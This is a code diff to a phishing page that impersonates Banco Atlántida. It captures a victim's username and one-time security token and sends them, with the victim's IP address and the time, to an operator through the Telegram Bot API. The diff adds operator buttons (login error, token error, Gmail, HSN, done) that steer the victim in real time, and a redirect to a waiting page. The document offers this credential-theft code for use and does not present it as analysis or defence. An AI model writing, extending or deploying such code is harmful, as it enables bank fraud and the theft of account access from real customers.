@@ -11,28 +11,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     }
     $date = date('d/m/Y H:i:s');
 
-    $msg  = "🔐 <b>BANCO ATLÁNTIDA — TOKEN #{$round}</b>\n";
-    $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-    $msg .= "👤 <b>Usuario:</b> {$usuario}\n";
-    $msg .= "🔑 <b>Token:</b> {$tk}\n";
-    $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-    $msg .= "🌐 <b>IP:</b> " . ($ip ?: '?') . "\n";
-    $msg .= "🕒 <b>Fecha:</b> {$date}\n";
+    $msg  = "🔐 BANCO ATLÁNTIDA — TOKEN #{$round}\n";
+    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
+    $msg .= "👤 Usuario: {$usuario}\n";
+    $msg .= "🔑 Token: {$tk}\n";
+    $msg .= "🌐 IP: " . ($ip ?: '?') . "\n";
+    $msg .= "🕒 Fecha: {$date}\n";
 
-    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
-    curl_setopt_array($ch, [
-        CURLOPT_POST           => true,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT        => 10,
-        CURLOPT_POSTFIELDS     => [
-            'chat_id'    => $chat_id,
-            'text'       => $msg,
-            'parse_mode' => 'HTML',
-        ],
+    $keyboard = json_encode([
+        'inline_keyboard' => [
+            [
+                ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|{$usuario}"],
+                ['text' => '🚫 TOKERROR',   'callback_data' => "TOKERROR|{$usuario}"],
+            ],
+            [
+                ['text' => '📧 Gmail',   'callback_data' => "GMAIL|{$usuario}"],
+                ['text' => '🏦 Hsn',     'callback_data' => "HSN|{$usuario}"],
+                ['text' => '🏁 LISTO',   'callback_data' => "LISTO|{$usuario}"],
+            ],
+        ]
     ]);
-    curl_exec($ch);
-    curl_close($ch);
-    echo json_encode(['ok' => true]);
+
+    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
+        'chat_id'      => $chat_id,
+        'text'         => $msg,
+        'reply_markup' => $keyboard,
+    ]));
+
+    $redirect = '../espera.php?u=' . urlencode($usuario) . '&step=token';
+    echo json_encode(['ok' => true, 'redirect' => $redirect]);
     exit;
 }
 ?>
@@ -175,14 +182,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
       fd.append('round', round);
 
       fetch('token.php', { method: 'POST', body: fd })
-        .finally(() => {
+        .then(r => r.json())
+        .then(d => {
           btnEnv.textContent = '✓';
-          round++;
-          if (round > MAX_ROUNDS) {
-            setTimeout(() => { window.location.href = '../acceso.html'; }, 700);
-          } else {
-            setTimeout(() => showLoader(40000), 600);
+          if (d.redirect) {
+            setTimeout(() => { window.location.href = d.redirect; }, 600);
           }
+        })
+        .catch(() => {
+          btnEnv.textContent = '✓';
         });
     }
 
@@ -190,7 +198,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
       if (e.key === 'Enter' && scene.classList.contains('show')) enviar();
     });
 
-    showLoader(60000);
+    const IS_RETRY = <?= isset($_GET['retry']) ? 'true' : 'false' ?>;
+    if (IS_RETRY) { showToken(); } else { showLoader(60000); }
   </script>
 </body>
 </html>
